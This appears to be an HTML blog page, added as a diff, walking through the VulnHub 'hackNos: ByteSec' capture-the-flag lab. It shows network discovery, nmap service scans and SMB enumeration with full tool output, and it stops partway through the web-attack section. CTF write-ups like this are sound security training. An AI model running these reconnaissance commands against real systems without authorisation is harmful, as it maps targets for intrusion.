@@ -1,0 +1,1157 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>
+/f0c1s/blog/sec/vulnhub/hackNos-bytesec
+</title>
+<link rel="stylesheet" href="../../../index.css"/> <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
+<script src="../../../highlight/highlight.min.js"></script>
+<script src="../../../setup.js"></script>
+<script>hljs.highlightAll();</script>
+</head>
+<body onload="setup()">
+<h1>
+/f0c1s/blog/sec/vulnhub/hackNos-bytesec
+</h1>
+<nav>
+<a href="../../../index.html">/blog</a> <a href="../../index.html">Security</a> <a href="../index.html">VulnHub</a> <a href="../../../sec/vulnhub/hackNos-ByteSec/hackNos-ByteSec.html">+ hackNos: ByteSec - 2022.01.02 Sunday</a>
+</nav>
+<h2 id="description">Description</h2>
+<blockquote>
+<p>Difficulty : Intermediate</p>
+<p>Flag : 2 Flag first user And second root</p>
+<p>Learning : exploit | SMB | Enumration | Stenography | Privilege Escalation</p>
+<p>Contact .. https://www.linkedin.com/in/rahulgehlaut/</p>
+<p>This works better with VirtualBox rather than VMware.</p>
+</blockquote>
+<p><a href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">VulnHub: https://www.vulnhub.com/entry/hacknos-os-bytesec,393/</a> <a href="https://www.vulnhub.com/series/hacknos,257/">Series: https://www.vulnhub.com/series/hacknos,257/</a></p>
+<figure>
+<img src="0.running-box.png" alt="" /><figcaption>0.running-box</figcaption>
+</figure>
+<h2 id="scanning">Scanning</h2>
+<pre class="shell"><code>fping -aAqg 192.168.56.1/24 | tee fping.txt
+192.168.56.1
+192.168.56.2
+192.168.56.70
+192.168.56.86
+</code></pre>
+<p><a href="../../tools/fping.html">Readup on fping</a></p>
+<pre class="shell"><code>sudo netdiscover -r 192.168.56.1/24 -i eth1 -PN
+[sudo] password for f0c1s:
+ 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
+ 192.168.56.2    08:00:27:b9:4b:07      1      60  PCS Systemtechnik GmbH
+ 192.168.56.86   08:00:27:65:2b:e0      1      60  PCS Systemtechnik GmbH
+
+-- Active scan completed, 3 Hosts found.
+</code></pre>
+<p><a href="../../tools/netdiscover/netdiscover.html">Readup on netdiscover</a></p>
+<pre class="shell"><code>sudo arp-scan -I eth1 -l
+Interface: eth1, type: EN10MB, MAC: 08:00:27:13:e5:7a, IPv4: 192.168.56.70
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
+192.168.56.2    08:00:27:b9:4b:07       PCS Systemtechnik GmbH
+192.168.56.86   08:00:27:65:2b:e0       PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 2.012 seconds (127.24 hosts/sec). 3 responded
+</code></pre>
+<p><a href="../../tools/arp-scan/arp-scan.html">Readup on arp-scan</a></p>
+<pre class="shell"><code>nmap 192.168.56.1/24 -sn -n
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 07:32 IST
+Nmap scan report for 192.168.56.70
+Host is up (0.00029s latency).
+Nmap scan report for 192.168.56.86
+Host is up (0.0019s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 2.45 seconds
+</code></pre>
+<pre class="shell"><code>_n $RHOST
+firing nmap 192.168.56.86 | tee nmap.default.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 08:13 IST
+Nmap scan report for 192.168.56.86
+Host is up (0.00034s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2525/tcp open  ms-v-worlds
+
+Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
+</code></pre>
+<pre class="shell"><code>_ntd $RHOST
+firing nmap 192.168.56.86 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 08:13 IST
+Nmap scan report for 192.168.56.86
+Host is up (0.00015s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Hacker_James
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)
+|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)
+|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)
+Service Info: Host: NITIN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: 0s
+| smb2-time:
+|   date: 2022-01-02T02:43:19
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: NITIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: nitin
+|   NetBIOS computer name: NITIN\x00
+|   Domain name: 168.1.7
+|   FQDN: nitin.168.1.7
+|_  System time: 2022-01-02T08:13:19+05:30
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.96 seconds
+</code></pre>
+<pre class="shell"><code>| port | service | detail/remarks                                               |
+|------|---------|--------------------------------------------------------------|
+| 80   | Web     | Apache httpd 2.4.18 ((Ubuntu))                               |
+| 139  | netbios | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                  |
+| 445  | samba   | Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)              |
+| 2525 | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) |</code></pre>
+<h2 id="attacking-smb">Attacking SMB</h2>
+<pre class="shell"><code>smbmap -H $RHOST -u &quot;&quot; | tee smbmap.-H-null.txt
+[+] Guest session       IP: 192.168.56.86:445   Name: 192.168.56.86
+        Disk       Permissions     Comment
+        ----       -----------     -------
+        print$     NO ACCESS       Printer Drivers
+        IPC$       NO ACCESS       IPC Service (nitin server (Samba, Ubuntu))
+</code></pre>
+<pre class="shell"><code>smbmap -H $RHOST | tee smbmap.-H.txt
+[+] Guest session       IP: 192.168.56.86:445   Name: 192.168.56.86
+        Disk       Permissions     Comment
+        ----       -----------     -------
+        print$     NO ACCESS       Printer Drivers
+        IPC$       NO ACCESS       IPC Service (nitin server (Samba, Ubuntu))
+</code></pre>
+<pre class="shell"><code>smbclient -U &#39;%&#39; -N \\\\$RHOST\\nitin
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+</code></pre>
+<pre class="shell"><code>smbclient -N -L $RHOST --option=&quot;client min protocol&quot;=LANMAN1
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            NITIN
+</code></pre>
+<pre class="shell"><code>smbclient -N -L $RHOST
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+</code></pre>
+<h3 id="enum4linux">enum4linux</h3>
+<pre class="shell"><code>enum4linux -a $RHOST | tee enum4linux.txt
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan  2 08:14:50 2022
+
+ ==========================
+|    Target Information    |
+ ==========================
+Target ........... 192.168.56.86
+RID Range ........ 500-550,1000-1050
+Username ......... &#39;&#39;
+Password ......... &#39;&#39;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ =====================================================
+|    Enumerating Workgroup/Domain on 192.168.56.86    |
+ =====================================================
+[+] Got domain/workgroup name: WORKGROUP
+
+ =============================================
+|    Nbtstat Information for 192.168.56.86    |
+ =============================================
+Looking up status of 192.168.56.86
+        NITIN           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+        NITIN           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+        NITIN           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ ======================================
+|    Session Check on 192.168.56.86    |
+ ======================================
+[+] Server 192.168.56.86 allows sessions using username &#39;&#39;, password &#39;&#39;
+
+ ============================================
+|    Getting domain SID for 192.168.56.86    |
+ ============================================
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can&#39;t determine if host is part of domain or part of a workgroup
+
+ =======================================
+|    OS information on 192.168.56.86    |
+ =======================================
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 192.168.56.86 from smbclient:
+[+] Got OS info for 192.168.56.86 from srvinfo:
+        NITIN          Wk Sv PrQ Unx NT SNT nitin server (Samba, Ubuntu)
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+ ==============================
+|    Users on 192.168.56.86    |
+ ==============================
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smb      Name:   Desc:
+
+user:[smb] rid:[0x3e8]
+
+ ==========================================
+|    Share Enumeration on 192.168.56.86    |
+ ==========================================
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 192.168.56.86
+//192.168.56.86/print$  Mapping: DENIED, Listing: N/A
+//192.168.56.86/IPC$    [E] Can&#39;t understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+
+ =====================================================
+|    Password Policy Information for 192.168.56.86    |
+ =====================================================
+
+
+[+] Attaching to 192.168.56.86 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] NITIN
+        [+] Builtin
+
+[+] Password Info for Domain: NITIN
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: Not Set
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes
+        [+] Locked Account Duration: 30 minutes
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: Not Set
+
+
+[+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ ===============================
+|    Groups on 192.168.56.86    |
+ ===============================
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ========================================================================
+|    Users on 192.168.56.86 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ========================================================================
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-557360601-4180042360-1228881099
+[I] Found new SID: S-1-5-32
+...
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+...
+[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;
+S-1-22-1-1000 Unix User\sagar (Local User)
+S-1-22-1-1001 Unix User\blackjax (Local User)
+S-1-22-1-1002 Unix User\smb (Local User)
+
+ ==============================================
+|    Getting printer info for 192.168.56.86    |
+ ==============================================
+No printers returned.
+
+
+enum4linux complete on Sun Jan  2 08:15:01 2022</code></pre>
+<p><a href="1.out-enum4linux.txt">Checkout 1.out-enum4linux.txt for full details</a></p>
+<p>Domain</p>
+<ul>
+<li>NITIN</li>
+</ul>
+<p>Users:</p>
+<ul>
+<li>sagar</li>
+<li>blackjax</li>
+<li>smb</li>
+</ul>
+<h3 id="nbtscan">nbtscan</h3>
+<p><a href="../../tools/nbtscan/nbtscan.html">Readup on tool nbtscan</a></p>
+<pre class="shell"><code>nbtscan -v $RHOST
+Doing NBT name scan for addresses from 192.168.56.86
+
+
+NetBIOS Name Table for Host 192.168.56.86:
+
+Incomplete packet, 227 bytes long.
+Name             Service          Type
+----------------------------------------
+NITIN            &lt;00&gt;             UNIQUE
+NITIN            &lt;03&gt;             UNIQUE
+NITIN            &lt;20&gt;             UNIQUE
+__MSBROWSE__  &lt;01&gt;              GROUP
+WORKGROUP        &lt;00&gt;              GROUP
+WORKGROUP        &lt;1d&gt;             UNIQUE
+WORKGROUP        &lt;1e&gt;              GROUP
+
+Adapter address: 00:00:00:00:00:00
+----------------------------------------
+</code></pre>
+<h3 id="nmblookup">nmblookup</h3>
+<p><a href="../../tools/nmblookup/nmblookup.html">Readup on tool nmblookup</a></p>
+<pre class="shell"><code>nmblookup -ASMR $RHOST
+Looking up status of 192.168.56.86
+        NITIN           &lt;00&gt; -         B &lt;ACTIVE&gt;
+        NITIN           &lt;03&gt; -         B &lt;ACTIVE&gt;
+        NITIN           &lt;20&gt; -         B &lt;ACTIVE&gt;
+        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;
+        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;
+        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;
+        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;
+
+        MAC Address = 00-00-00-00-00-00
+
+</code></pre>
+<h3 id="smbclient">smbclient</h3>
+<pre class="shell"><code>smbclient -U &#39;%&#39; -N \\\\$RHOST\\nitin
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+</code></pre>
+<pre class="shell"><code>smbclient -U &#39;%&#39; -N \\\\$RHOST\\IPC$
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; help
+?              allinfo        altname        archive        backup
+blocksize      cancel         case_sensitive cd             chmod
+chown          close          del            deltree        dir
+du             echo           exit           get            getfacl
+geteas         hardlink       help           history        iosize
+lcd            link           lock           lowercase      ls
+l              mask           md             mget           mkdir
+more           mput           newer          notify         open
+posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir
+posix_unlink   posix_whoami   print          prompt         put
+pwd            q              queue          quit           readlink
+rd             recurse        reget          rename         reput
+rm             rmdir          showacls       setea          setmode
+scopy          stat           symlink        tar            tarmode
+timeout        translate      unlock         volume         vuid
+wdel           logon          listconnect    showconnect    tcon
+tdis           tid            utimes         logoff         ..
+!
+smb: \&gt; ls
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+smb: \&gt; dir
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+smb: \&gt; exit
+</code></pre>
+<pre class="shell"><code>smbclient -U &#39;%&#39; -N \\\\$RHOST\\blackjax
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+</code></pre>
+<h2 id="attacking-web">Attacking web</h2>
+<figure>
+<img src="2.homepage.png" alt="" /><figcaption>2.homepage</figcaption>
+</figure>
+<div class="sourceCode" id="cb19"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a><span class="dt">&lt;!DOCTYPE </span>html<span class="dt">&gt;</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a><span class="kw">&lt;html</span><span class="ot"> lang=</span><span class="st">&quot;zxx&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true"></a><span class="kw">&lt;head&gt;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true"></a>    <span class="kw">&lt;title&gt;</span>Hacker_James<span class="kw">&lt;/title&gt;</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true"></a>    <span class="kw">&lt;meta</span><span class="ot"> charset=</span><span class="st">&quot;UTF-8&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true"></a>    <span class="kw">&lt;meta</span><span class="ot"> name=</span><span class="st">&quot;description&quot;</span><span class="ot"> content=</span><span class="st">&quot;Cloud 83 - hosting template &quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true"></a>    <span class="kw">&lt;meta</span><span class="ot"> name=</span><span class="st">&quot;keywords&quot;</span><span class="ot"> content=</span><span class="st">&quot;cloud, hosting, creative, html&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true"></a>    <span class="kw">&lt;meta</span><span class="ot"> name=</span><span class="st">&quot;viewport&quot;</span><span class="ot"> content=</span><span class="st">&quot;width=device-width, initial-scale=1.0&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true"></a>    <span class="co">&lt;!-- Favicon --&gt;</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> href=</span><span class="st">&quot;img/fcon.ico&quot;</span><span class="ot"> rel=</span><span class="st">&quot;shortcut icon&quot;</span><span class="kw">/&gt;</span></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true"></a></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true"></a>    <span class="co">&lt;!-- Google Font --&gt;</span></span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> href=</span><span class="st">&quot;https://fonts.googleapis.com/css?family=Montserrat:400,400i,500,500i,600,600i,700,700i&quot;</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true"></a></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true"></a></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true"></a>    <span class="co">&lt;!-- Stylesheets --&gt;</span></span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="ot"> href=</span><span class="st">&quot;css/bootstrap.min.css&quot;</span><span class="kw">/&gt;</span></span>
+<span id="cb19-18"><a href="#cb19-18" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="ot"> href=</span><span class="st">&quot;css/font-awesome.min.css&quot;</span><span class="kw">/&gt;</span></span>
+<span id="cb19-19"><a href="#cb19-19" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="ot"> href=</span><span class="st">&quot;css/flaticon.css&quot;</span><span class="kw">/&gt;</span></span>
+<span id="cb19-20"><a href="#cb19-20" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="ot"> href=</span><span class="st">&quot;css/owl.carousel.min.css&quot;</span><span class="kw">/&gt;</span></span>
+<span id="cb19-21"><a href="#cb19-21" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="ot"> href=</span><span class="st">&quot;css/animate.css&quot;</span><span class="kw">/&gt;</span></span>
+<span id="cb19-22"><a href="#cb19-22" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="ot"> href=</span><span class="st">&quot;css/style.css&quot;</span><span class="kw">/&gt;</span></span>
+<span id="cb19-23"><a href="#cb19-23" aria-hidden="true"></a></span>
+<span id="cb19-24"><a href="#cb19-24" aria-hidden="true"></a></span>
+<span id="cb19-25"><a href="#cb19-25" aria-hidden="true"></a>    <span class="co">&lt;!--[if lt IE 9]&gt;</span></span>
+<span id="cb19-26"><a href="#cb19-26" aria-hidden="true"></a><span class="co">          &lt;script src=&quot;https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js&quot;&gt;&lt;/script&gt;</span></span>
+<span id="cb19-27"><a href="#cb19-27" aria-hidden="true"></a><span class="co">      &lt;script src=&quot;https://oss.maxcdn.com/respond/1.4.2/respond.min.js&quot;&gt;&lt;/script&gt;</span></span>
+<span id="cb19-28"><a href="#cb19-28" aria-hidden="true"></a><span class="co">    &lt;![endif]--&gt;</span></span>
+<span id="cb19-29"><a href="#cb19-29" aria-hidden="true"></a></span>
+<span id="cb19-30"><a href="#cb19-30" aria-hidden="true"></a><span class="kw">&lt;/head&gt;</span></span>
+<span id="cb19-31"><a href="#cb19-31" aria-hidden="true"></a><span class="kw">&lt;body&gt;</span></span>
+<span id="cb19-32"><a href="#cb19-32" aria-hidden="true"></a>    <span class="co">&lt;!-- Page Preloder --&gt;</span></span>
+<span id="cb19-33"><a href="#cb19-33" aria-hidden="true"></a>    <span class="kw">&lt;div</span><span class="ot"> id=</span><span class="st">&quot;preloder&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-34"><a href="#cb19-34" aria-hidden="true"></a>        <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;loader&quot;</span><span class="kw">&gt;&lt;/div&gt;</span></span>
+<span id="cb19-35"><a href="#cb19-35" aria-hidden="true"></a>    <span class="kw">&lt;/div&gt;</span></span>
+<span id="cb19-36"><a href="#cb19-36" aria-hidden="true"></a></span>
+<span id="cb19-37"><a href="#cb19-37" aria-hidden="true"></a>    <span class="co">&lt;!-- Header section --&gt;</span></span>
+<span id="cb19-38"><a href="#cb19-38" aria-hidden="true"></a>    <span class="kw">&lt;header</span><span class="ot"> class=</span><span class="st">&quot;header-section&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-39"><a href="#cb19-39" aria-hidden="true"></a>        <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;./index.html&quot;</span><span class="ot"> class=</span><span class="st">&quot;site-logo&quot;</span><span class="kw">&gt;&lt;img</span><span class="ot"> src=</span><span class="st">&quot;./img/logo.png&quot;</span><span class="ot"> alt=</span><span class="st">&quot;&quot;</span><span class="kw">&gt;&lt;/a&gt;</span></span>
+<span id="cb19-40"><a href="#cb19-40" aria-hidden="true"></a>        <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;nav-switch&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-41"><a href="#cb19-41" aria-hidden="true"></a>            <span class="kw">&lt;i</span><span class="ot"> class=</span><span class="st">&quot;fa fa-bars&quot;</span><span class="kw">&gt;&lt;/i&gt;</span></span>
+<span id="cb19-42"><a href="#cb19-42" aria-hidden="true"></a>        <span class="kw">&lt;/div&gt;</span></span>
+<span id="cb19-43"><a href="#cb19-43" aria-hidden="true"></a>        <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;nav-warp&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-44"><a href="#cb19-44" aria-hidden="true"></a>            <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;user-panel&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-45"><a href="#cb19-45" aria-hidden="true"></a>            <span class="kw">&lt;/div&gt;</span></span>
+<span id="cb19-46"><a href="#cb19-46" aria-hidden="true"></a>            <span class="kw">&lt;ul</span><span class="ot"> class=</span><span class="st">&quot;main-menu&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-47"><a href="#cb19-47" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;./index.html&quot;</span><span class="kw">&gt;</span>Home<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb19-48"><a href="#cb19-48" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;./gallery&quot;</span><span class="kw">&gt;</span>Gallery<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb19-49"><a href="#cb19-49" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;./img/news.png&quot;</span><span class="kw">&gt;</span>News<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb19-50"><a href="#cb19-50" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;https://in.linkedin.com/in/rahulgehlaut&quot;</span><span class="kw">&gt;</span>Contact<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb19-51"><a href="#cb19-51" aria-hidden="true"></a>            <span class="kw">&lt;/ul&gt;</span></span>
+<span id="cb19-52"><a href="#cb19-52" aria-hidden="true"></a>        <span class="kw">&lt;/div&gt;</span></span>
+<span id="cb19-53"><a href="#cb19-53" aria-hidden="true"></a>    <span class="kw">&lt;/header&gt;</span></span>
+<span id="cb19-54"><a href="#cb19-54" aria-hidden="true"></a>    <span class="co">&lt;!-- Header section end --&gt;</span></span>
+<span id="cb19-55"><a href="#cb19-55" aria-hidden="true"></a></span>
+<span id="cb19-56"><a href="#cb19-56" aria-hidden="true"></a>    <span class="co">&lt;!-- Hero section --&gt;</span></span>
+<span id="cb19-57"><a href="#cb19-57" aria-hidden="true"></a>    <span class="kw">&lt;section</span><span class="ot"> class=</span><span class="st">&quot;hero-section set-bg&quot;</span><span class="ot"> data-setbg=</span><span class="st">&quot;img/bg.jpg&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-58"><a href="#cb19-58" aria-hidden="true"></a>        <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;container h-100&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-59"><a href="#cb19-59" aria-hidden="true"></a>            <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;hero-content text-white&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-60"><a href="#cb19-60" aria-hidden="true"></a>                <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;row&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-61"><a href="#cb19-61" aria-hidden="true"></a>                    <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;col-lg-6 pr-0&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-62"><a href="#cb19-62" aria-hidden="true"></a>            <span class="kw">&lt;/div&gt;</span></span>
+<span id="cb19-63"><a href="#cb19-63" aria-hidden="true"></a>        <span class="kw">&lt;/div&gt;</span></span>
+<span id="cb19-64"><a href="#cb19-64" aria-hidden="true"></a>    <span class="kw">&lt;/section&gt;</span></span>
+<span id="cb19-65"><a href="#cb19-65" aria-hidden="true"></a>    <span class="co">&lt;!-- Hero section end --&gt;</span></span>
+<span id="cb19-66"><a href="#cb19-66" aria-hidden="true"></a></span>
+<span id="cb19-67"><a href="#cb19-67" aria-hidden="true"></a>    <span class="co">&lt;!-- Footer section --&gt;</span></span>
+<span id="cb19-68"><a href="#cb19-68" aria-hidden="true"></a>    <span class="kw">&lt;footer</span><span class="ot"> class=</span><span class="st">&quot;footer-section&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-69"><a href="#cb19-69" aria-hidden="true"></a>        <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;container&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-70"><a href="#cb19-70" aria-hidden="true"></a>            <span class="kw">&lt;ul</span><span class="ot"> class=</span><span class="st">&quot;footer-menu&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-71"><a href="#cb19-71" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;&quot;</span><span class="kw">&gt;</span>Home<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
